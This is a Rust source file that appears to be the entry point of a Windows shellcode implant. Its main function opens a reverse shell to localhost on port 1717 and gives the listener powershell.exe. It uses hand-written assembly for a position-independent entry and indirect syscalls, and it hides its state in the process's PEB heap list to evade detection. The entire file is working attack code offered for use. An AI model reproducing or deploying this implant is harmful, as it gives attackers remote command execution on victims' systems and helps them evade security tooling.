#![no_std]
#![no_main]

extern crate alloc;
extern crate panic_halt;

use core::arch::global_asm;
use core::ffi::c_void;
use libs::k32::init_kernel32_funcs;
use libs::ntapi::init_ntdll_funcs;
use libs::winsock::init_winsock_funcs;
use rev::reverse_shell;

mod libs;
mod rev;

use libs::instance::Instance;
use libs::instance::INSTANCE_MAGIC;
use libs::ntdef::find_peb;

// Set a custom global allocator
use crate::libs::allocator::NtVirtualAlloc;

#[global_allocator]
static GLOBAL: NtVirtualAlloc = NtVirtualAlloc;

#[no_mangle]
pub extern "C" fn initialize() {
    unsafe {
        // Stack allocation of Instance
        let mut instance = Instance::new();

        // Append instance address to PEB.ProcessHeaps
        let instance_ptr: *mut c_void = &mut instance as *mut _ as *mut c_void;

        let peb = find_peb();
        let process_heaps = (*peb).process_heaps as *mut *mut c_void;
        let number_of_heaps = (*peb).number_of_heaps as usize;

        // Increase the NumberOfHeaps
        (*peb).number_of_heaps += 1;

        // Append the instance_ptr
        *process_heaps.add(number_of_heaps) = instance_ptr;

        // Proceed to main function
        main();
    }
}

/// Initializes system modules and functions, and then starts a reverse shell.
unsafe fn main() {
    let lhost = "localhost";
    let lport = 1717;
    let process = "powershell.exe";

    init_ntdll_funcs();
    init_kernel32_funcs();
    init_winsock_funcs();
    reverse_shell(&lhost, lport, &process);
}

global_asm!(
    r#"
.globl _start
.globl isyscall

.section .text

_start:
    push  rsi
    mov   rsi, rsp
    and   rsp, 0xFFFFFFFFFFFFFFF0
    sub   rsp, 0x20
    call  initialize
    mov   rsp, rsi
    pop   rsi
    ret

isyscall:
    mov [rsp - 0x8],  rsi
    mov [rsp - 0x10], rdi
    mov [rsp - 0x18], r12

    xor r10, r10			
    mov rax, rcx			
    mov r10, rax

    mov eax, ecx

    mov r12, rdx
    mov rcx, r8

    mov r10, r9
    mov rdx,  [rsp + 0x28]
    mov r8,   [rsp + 0x30]
    mov r9,   [rsp + 0x38]

    sub rcx, 0x4
    jle skip

    lea rsi,  [rsp + 0x40]
    lea rdi,  [rsp + 0x28]

    rep movsq
skip:
    mov rcx, r12

    mov rsi, [rsp - 0x8]
    mov rdi, [rsp - 0x10]
    mov r12, [rsp - 0x18]

    jmp rcx
"#
);

extern "C" {
    fn _start();
}

/// Attempts to locate the global `Instance` by scanning process heaps and
/// returns a mutable reference to it if found.
unsafe fn get_instance() -> Option<&'static mut Instance> {
    let peb = find_peb(); // Locate the PEB (Process Environment Block)
    let process_heaps = (*peb).process_heaps;
    let number_of_heaps = (*peb).number_of_heaps as usize;

    for i in 0..number_of_heaps {
        let heap = *process_heaps.add(i);
        if !heap.is_null() {
            let instance = &mut *(heap as *mut Instance);
            if instance.magic == INSTANCE_MAGIC {
                return Some(instance); // Return the instance if the magic value matches
            }
        }
    }
    None
}
